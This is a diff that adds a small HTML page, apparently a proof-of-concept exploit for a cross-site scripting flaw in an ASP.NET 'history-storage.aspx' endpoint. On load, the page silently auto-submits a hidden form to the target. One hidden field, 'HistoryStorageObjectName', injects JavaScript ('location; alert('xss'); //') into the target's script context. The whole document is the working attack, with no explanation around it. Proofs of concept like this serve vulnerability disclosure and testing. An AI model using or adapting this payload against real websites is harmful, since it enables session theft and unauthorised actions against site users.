@@ -1,0 +1,14 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;/head&gt;
+&lt;body onLoad=&quot;document.form1.submit()&quot;&gt;
+&lt;form name=&quot;form1&quot; method=&quot;post&quot;
+action=&quot;http://www.example.com/history-storage.aspx?param=0.21188772204998574&quot;
+onSubmit=&quot;return false;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;HistoryKey&quot; value=&quot;value&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;HistoryStorageObjectName&quot; value=&quot;location;
+alert(&#039;xss&#039;); //&quot;/&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
